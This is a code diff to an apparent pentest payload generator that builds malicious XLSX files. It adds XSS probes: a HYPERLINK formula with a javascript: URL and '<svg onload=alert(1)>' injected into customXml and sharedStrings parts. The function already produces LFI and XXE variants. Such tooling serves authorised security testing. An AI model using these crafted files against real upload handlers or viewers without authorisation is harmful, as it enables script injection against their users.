@@ -15,6 +15,8 @@ def generate_xlsx_payloads(output_dir, burp_collab):
     lfi_dir.mkdir(exist_ok=True)
     xxe_dir = output_dir / 'xxe'
     xxe_dir.mkdir(exist_ok=True)
+    xss_dir = output_dir / 'xss'
+    xss_dir.mkdir(exist_ok=True)
     
     wb = Workbook()
     ws = wb.active
@@ -111,6 +113,45 @@ def generate_xlsx_payloads(output_dir, burp_collab):
 <sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="1" uniqueCount="1">
 <si><t>test</t></si>
 </sst>''')
+    
+    with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
+        for file_path in temp_dir.rglob('*'):
+            if file_path.is_file():
+                arcname = file_path.relative_to(temp_dir)
+                zip_ref.write(file_path, arcname)
+    
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    
+    wb = Workbook()
+    ws = wb.active
+    ws['A1'] = '=HYPERLINK("javascript:alert(1)","click ici")'
+    wb.save(xss_dir / "xss1_hyperlink_js.xlsx")
+    
+    wb = Workbook()
+    ws = wb.active
+    xlsx_path = xss_dir / "xss2_customxml_svg.xlsx"
+    wb.save(xlsx_path)
+    
+    with zipfile.ZipFile(xlsx_path, 'r') as zip_ref:
+        temp_dir = output_dir / "temp_xss2"
+        zip_ref.extractall(temp_dir)
+    
+    customxml_dir = temp_dir / "customXml"
+    customxml_dir.mkdir(parents=True, exist_ok=True)
+    with open(customxml_dir / "item1.xml", 'w', encoding='utf-8') as f:
+        f.write('<?xml version="1.0"?><xml><x><![CDATA[<svg onload=alert(1)>]]></x></xml>')
+    
+    sharedstrings_path = temp_dir / "xl" / "sharedStrings.xml"
+    if sharedstrings_path.exists():
+        tree = ET.parse(sharedstrings_path)
+        root = tree.getroot()
+        ns = {'main': 'http://schemas.openxmlformats.org/spreadsheetml/2006/main'}
+        si = root.find('.//main:si', ns)
+        if si is not None:
+            t = si.find('.//main:t', ns)
+            if t is not None:
+                t.text = '<svg onload=alert(1)>'
+        tree.write(sharedstrings_path, encoding='utf-8', xml_declaration=True)
     
     with zipfile.ZipFile(xlsx_path, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
         for file_path in temp_dir.rglob('*'):
